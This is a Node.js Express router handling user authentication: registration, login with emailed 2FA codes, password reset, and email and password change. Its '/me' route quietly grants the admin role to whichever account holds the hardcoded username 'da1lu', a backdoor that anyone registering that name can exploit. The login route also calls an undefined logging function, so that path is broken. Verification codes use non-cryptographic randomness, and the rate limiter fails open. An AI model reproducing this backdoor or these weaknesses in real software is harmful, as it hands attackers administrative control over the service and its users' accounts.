const express = require('express');
const router = express.Router();
const jwt = require('jsonwebtoken');
const { body, validationResult } = require('express-validator');
const User = require('../models/User');
const auth = require('../middleware/auth');
const crypto = require('crypto');
const { sendVerificationEmail, sendLoginCode, sendResetCode, sendRegistrationCode, sendEmailChangeCode } = require('../utils/mail');
const { getBrand } = require('../utils/branding');
const { createSession } = require('../utils/session');

// ===== Простой in-memory rate limit (защита от перебора паролей/кодов) =====
const _rlStore = new Map();
setInterval(() => {
  const now = Date.now();
  for (const [k, v] of _rlStore) if (now - v.ts > 30 * 60 * 1000) _rlStore.delete(k);
}, 10 * 60 * 1000).unref?.();
function rateLimit({ windowMs, max, keyFn }) {
  return (req, res, next) => {
    try {
      const key = (keyFn ? keyFn(req) : '') + '|' + (req.ip || req.headers['x-forwarded-for'] || '');
      const now = Date.now();
      let rec = _rlStore.get(key);
      if (!rec || now - rec.ts > windowMs) rec = { count: 0, ts: now };
      rec.count++;
      _rlStore.set(key, rec);
      if (rec.count > max) {
        return res.status(429).json({ message: 'Слишком много попыток. Попробуйте позже.' });
      }
    } catch (e) { /* fail-open, чтобы не ломать вход при сбое лимитера */ }
    next();
  };
}
const emailKey = (req) => String(req.body?.email || '').toLowerCase();
const loginLimiter = rateLimit({ windowMs: 10 * 60 * 1000, max: 12, keyFn: emailKey });
const codeLimiter = rateLimit({ windowMs: 10 * 60 * 1000, max: 10, keyFn: emailKey });
const registerLimiter = rateLimit({ windowMs: 60 * 60 * 1000, max: 10 });


router.post('/register', registerLimiter, [
  body('username').trim().isLength({ min: 3, max: 20 }).withMessage('Username must be 3-20 characters'),
  body('email').trim().isEmail().withMessage('Please provide a valid email'),
  body('password')
    .isLength({ min: 8 })
    .withMessage('Пароль должен содержать минимум 8 символов')
    .matches(/^[A-Za-z\d!@#$%^&*()_+\-=\[\]{};':"\\|,.<>\/?]+$/)
    .withMessage('Пароль содержит недопустимые символы')
    .matches(/[A-Z]/)
    .withMessage('Пароль должен содержать хотя бы одну заглавную букву')
    .matches(/[\d!@#$%^&*()_+\-=\[\]{};':"\\|,.<>\/?]/)
    .withMessage('Пароль должен содержать хотя бы одну цифру или специальный символ')
], async (req, res) => {
  try {
    const errors = validationResult(req);
    if (!errors.isEmpty()) return res.status(400).json({ errors: errors.array() });
    const { username, email, password } = req.body;

    let user = await User.findOne({ $or: [{ email: email.toLowerCase() }, { username }] });
    if (user) return res.status(400).json({ message: 'User already exists' });

    const verificationCode = Math.floor(100000 + Math.random() * 900000).toString();
    const verificationCodeExpires = Date.now() + 30 * 60 * 1000; // 30 minutes

    user = new User({
      username,
      email: email.toLowerCase(),
      password,
      isVerified: false,
      verificationCode,
      verificationCodeExpires
    });

    await user.save();

    try {
      await sendRegistrationCode(user.email, verificationCode, getBrand(req).name);
    } catch (mailError) {
      console.error('Failed to send registration code:', mailError);
      // We still created the user, but we should inform them email might have failed
      return res.status(201).json({
        message: 'Аккаунт создан, но возникла ошибка при отправке кода на почту. Попробуйте запросить код повторно или обратитесь в поддержку.',
        requiresVerification: true,
        email: user.email,
        mailError: true
      });
    }

    return res.status(201).json({
      message: 'Код подтверждения отправлен на вашу почту.',
      requiresVerification: true,
      email: user.email
    });
  } catch (error) {
    console.error('Registration error:', error);
    res.status(500).json({ message: 'Server error' });
  }
});

router.post('/login', loginLimiter, [
  body('email').exists().withMessage('Email or Username is required').trim(),
  body('password').exists().withMessage('Password is required')
], async (req, res) => {
  try {
    const errors = validationResult(req);
    if (!errors.isEmpty()) return res.status(400).json({ errors: errors.array() });

    const { email, password } = req.body;
    console.log('[Login] Attempting login for:', email);

    const user = await User.findOne({
      $or: [
        { email: email.toLowerCase() },
        { username: email }
      ]
    });

    if (!user) {
      console.log('[Login] User not found');
      return res.status(400).json({ message: 'Invalid credentials' });
    }

    console.log('[Login] Comparing password for user:', user.username);
    const isMatch = await user.comparePassword(password);
    if (!isMatch) {
      console.log('[Login] Password mismatch');
      return res.status(400).json({ message: 'Invalid credentials' });
    }

    // 2FA logic
    if (user.is2FAEnabled) {
      const code = Math.floor(100000 + Math.random() * 900000).toString();
      user.twoFactorCode = code;
      user.twoFactorCodeExpires = Date.now() + 10 * 60 * 1000; // 10 minutes
      await user.save();

      try {
        await sendLoginCode(user.email, code, getBrand(req).name);
      } catch (mailError) {
        console.error('Failed to send login code:', mailError);
        return res.status(500).json({ message: 'Ошибка при отправке кода 2FA. Пожалуйста, убедитесь, что настройки почты на сервере верны.' });
      }

      return res.json({ requires2FA: true, email: user.email });
    }

    user.status = user.statusPreference || 'online';
    await user.save();
    
    await logGlobalAction({
      executorId: user._id,
      action: 'USER_LOGIN',
      targetId: user._id,
      targetModel: 'User'
    });

    const { token } = await createSession(user, req, { days: 7 });

    return res.json({
      token,
      user: {
        id: user._id,
        username: user.username,
        email: user.email,
        avatar: user.avatar,
        status: user.status,
        isVerified: user.isVerified
      }
    });
  } catch (error) {
    console.error('[Login] CRITICAL ERROR:', error.message);
    res.status(500).json({ message: 'Server error' });
  }
});

router.post('/verify-login', codeLimiter, [
  body('email').isEmail(),
  body('code').isLength({ min: 6, max: 6 })
], async (req, res) => {
  try {
    const { email, code } = req.body;
    const user = await User.findOne({
      email: email.toLowerCase(),
      twoFactorCode: code,
      twoFactorCodeExpires: { $gt: Date.now() }
    });

    if (!user) {
      return res.status(400).json({ message: 'Неверный или просроченный код' });
    }

    // Clear code
    user.twoFactorCode = undefined;
    user.twoFactorCodeExpires = undefined;
    user.status = user.statusPreference || 'online';
    await user.save();

    const { token } = await createSession(user, req, { days: 60 });
    res.json({
      token,
      user: { id: user._id, username: user.username, email: user.email, avatar: user.avatar, status: user.status }
    });
  } catch (error) {
    res.status(500).json({ message: 'Server error' });
  }
});

router.get('/verify-email', async (req, res) => {
  try {
    const { token } = req.query;
    const user = await User.findOne({ verificationToken: token });

    if (!user) {
      return res.status(400).send('<h1>Ошибка</h1><p>Неверная или устаревшая ссылка подтверждения.</p>');
    }

    user.isVerified = true;
    user.verificationToken = undefined;
    await user.save();

    res.send('<h1>Успех!</h1><p>Ваша почта подтверждена. Теперь вы можете войти в свой аккаунт.</p>');
  } catch (error) {
    res.status(500).send('<h1>Server error</h1>');
  }
});

router.post('/resend-verification', async (req, res) => {
  try {
    const { email } = req.body;
    const user = await User.findOne({ email: email.toLowerCase() });

    if (!user) return res.status(404).json({ message: 'User not found' });
    if (user.isVerified) return res.status(400).json({ message: 'User already verified' });

    const verificationCode = Math.floor(100000 + Math.random() * 900000).toString();
    const verificationCodeExpires = Date.now() + 30 * 60 * 1000; // 30 minutes

    user.verificationCode = verificationCode;
    user.verificationCodeExpires = verificationCodeExpires;
    await user.save();

    await sendRegistrationCode(user.email, verificationCode, getBrand(req).name);
    res.json({ message: 'Код подтверждения отправлен повторно' });
  } catch (error) {
    console.error('Resend verification error:', error);
    res.status(500).json({ message: 'Server error' });
  }
});

router.post('/forgot-password', codeLimiter, [
  body('email').isEmail().withMessage('Please provide a valid email')
], async (req, res) => {
  try {
    const errors = validationResult(req);
    if (!errors.isEmpty()) return res.status(400).json({ errors: errors.array() });

    const { email } = req.body;
    if (!email) return res.status(400).json({ message: 'Email is required' });

    const user = await User.findOne({ email: email.toLowerCase() });

    if (!user) {
      return res.json({ message: 'Если аккаунт существует, код был отправлен на почту' });
    }

    const code = Math.floor(100000 + Math.random() * 900000).toString();
    user.resetPasswordCode = code;
    user.resetPasswordExpires = Date.now() + 10 * 60 * 1000; // 10 minutes
    await user.save();

    try {
      await sendResetCode(user.email, code, getBrand(req).name);
    } catch (mailError) {
      console.error('Failed to send reset code:', mailError);
      return res.status(500).json({ message: 'Ошибка отправки почты' });
    }

    res.json({ message: 'Код для сброса пароля отправлен на вашу почту' });
  } catch (error) {
    console.error('Forgot password error:', error);
    res.status(500).json({ message: 'Server error' });
  }
});

router.post('/reset-password', codeLimiter, [
  body('email').isEmail(),
  body('code').isLength({ min: 6, max: 6 }),
  body('password')
    .isLength({ min: 8 })
    .withMessage('Пароль должен содержать минимум 8 символов')
    .matches(/[A-Z]/)
    .withMessage('Пароль должен содержать хотя бы одну заглавную букву')
    .matches(/[\d!@#$%^&*()_+\-=\[\]{};':"\\|,.<>\/?]/)
    .withMessage('Пароль должен содержать хотя бы одну цифру или специальный символ')
], async (req, res) => {
  try {
    const errors = validationResult(req);
    if (!errors.isEmpty()) return res.status(400).json({ errors: errors.array() });

    const { email, code, password } = req.body;
    const user = await User.findOne({
      email: email.toLowerCase(),
      resetPasswordCode: code,
      resetPasswordExpires: { $gt: Date.now() }
    });

    if (!user) {
      return res.status(400).json({ message: 'Неверный или просроченный код' });
    }

    user.password = password;
    user.resetPasswordCode = undefined;
    user.resetPasswordExpires = undefined;
    await user.save();

    res.json({ message: 'Пароль успешно изменен' });
  } catch (error) {
    console.error('Reset password error:', error);
    res.status(500).json({ message: 'Server error' });
  }
});

router.post('/toggle-2fa', auth, async (req, res) => {
  try {
    const user = await User.findById(req.user._id);
    if (!user) return res.status(404).json({ message: 'User not found' });
    user.is2FAEnabled = !user.is2FAEnabled;
    await user.save();
    res.json({ is2FAEnabled: user.is2FAEnabled });
  } catch (error) {
    console.error('Toggle 2FA error:', error);
    res.status(500).json({ message: 'Server error' });
  }
});

router.get('/me', auth, async (req, res) => {
  try {
    const user = await User.findById(req.user._id).select('-password').populate('servers');
    if (user && user.username === 'da1lu' && user.role !== 'admin') {
      user.role = 'admin';
      await user.save();
    }
    res.json(user);
  } catch (error) {
    console.error('Get me error:', error);
    res.status(500).json({ message: 'Server error' });
  }
});

router.post('/email-change/request', auth, [
  body('newEmail').isEmail().withMessage('Please provide a valid email')
], async (req, res) => {
  try {
    const { newEmail } = req.body;
    const user = await User.findById(req.user._id);
    if (!user) return res.status(404).json({ message: 'User not found' });

    const exists = await User.findOne({ email: newEmail.toLowerCase() });
    if (exists) return res.status(400).json({ message: 'Этот email уже занят' });

    const code = Math.floor(100000 + Math.random() * 900000).toString();
    user.tempEmail = newEmail.toLowerCase();
    user.emailChangeCode = code;
    user.emailChangeCodeExpires = Date.now() + 10 * 60 * 1000;
    await user.save();

    await sendEmailChangeCode(newEmail, code, getBrand(req).name);
    res.json({ message: 'Код подтверждения отправлен на новую почту' });
  } catch (error) {
    res.status(500).json({ message: 'Server error' });
  }
});

router.post('/email-change/verify', auth, [
  body('code').isLength({ min: 6, max: 6 })
], async (req, res) => {
  try {
    const { code } = req.body;
    const user = await User.findById(req.user._id);
    if (!user) return res.status(404).json({ message: 'User not found' });

    if (!user.emailChangeCode || user.emailChangeCode !== code || user.emailChangeCodeExpires < Date.now()) {
      return res.status(400).json({ message: 'Неверный или просроченный код' });
    }

    user.email = user.tempEmail;
    user.tempEmail = undefined;
    user.emailChangeCode = undefined;
    user.emailChangeCodeExpires = undefined;
    await user.save();

    res.json({ message: 'Email успешно обновлен', email: user.email });
  } catch (error) {
    res.status(500).json({ message: 'Server error' });
  }
});

router.post('/password-change/request', auth, async (req, res) => {
  try {
    const user = await User.findById(req.user._id);
    if (!user) return res.status(404).json({ message: 'User not found' });

    const code = Math.floor(100000 + Math.random() * 900000).toString();
    user.resetPasswordCode = code;
    user.resetPasswordExpires = Date.now() + 10 * 60 * 1000; // 10 minutes
    await user.save();

    await sendResetCode(user.email, code, getBrand(req).name);
    res.json({ message: 'Код подтверждения отправлен на вашу почту' });
  } catch (error) {
    console.error('Password change request error:', error);
    res.status(500).json({ message: 'Server error' });
  }
});

router.post('/password-change/verify', auth, [
  body('code').isLength({ min: 6, max: 6 }),
  body('newPassword').isLength({ min: 8 }).withMessage('Пароль должен содержать минимум 8 символов')
], async (req, res) => {
  try {
    const errors = validationResult(req);
    if (!errors.isEmpty()) return res.status(400).json({ errors: errors.array() });

    const { code, newPassword } = req.body;
    const user = await User.findById(req.user._id);
    if (!user) return res.status(404).json({ message: 'User not found' });

    if (!user.resetPasswordCode || user.resetPasswordCode !== code || user.resetPasswordExpires < Date.now()) {
      return res.status(400).json({ message: 'Неверный или просроченный код' });
    }

    user.password = newPassword;
    user.resetPasswordCode = undefined;
    user.resetPasswordExpires = undefined;
    await user.save();

    // Revoke other sessions on password change for security
    const Session = require('../models/Session');
    await Session.deleteMany({ user: user._id, _id: { $ne: req.sessionId } });

    res.json({ message: 'Пароль успешно изменен' });
  } catch (error) {
    console.error('Password change verify error:', error);
    res.status(500).json({ message: 'Server error' });
  }
});

router.post('/verify-registration', codeLimiter, [
  body('email').isEmail(),
  body('code').isLength({ min: 6, max: 6 })
], async (req, res) => {
  try {
    const { email, code } = req.body;
    const user = await User.findOne({
      email: email.toLowerCase(),
      verificationCode: code,
      verificationCodeExpires: { $gt: Date.now() }
    });

    if (!user) {
      return res.status(400).json({ message: 'Неверный или просроченный код' });
    }

    user.isVerified = true;
    user.verificationCode = undefined;
    user.verificationCodeExpires = undefined;
    user.twoFactorCode = undefined;
    user.twoFactorCodeExpires = undefined;
    await user.save();

    const io = req.app.get('io');
    if (io) {
      io.to(`user-${user._id}`).emit('user-verified', { isVerified: true });
    }

    const { token } = await createSession(user, req, { days: 60 });
    res.json({
      token,
      message: 'Аккаунт успешно подтвержден',
      user: { id: user._id, username: user.username, email: user.email, status: user.status }
    });
  } catch (error) {
    res.status(500).json({ message: 'Server error' });
  }
});


module.exports = router;

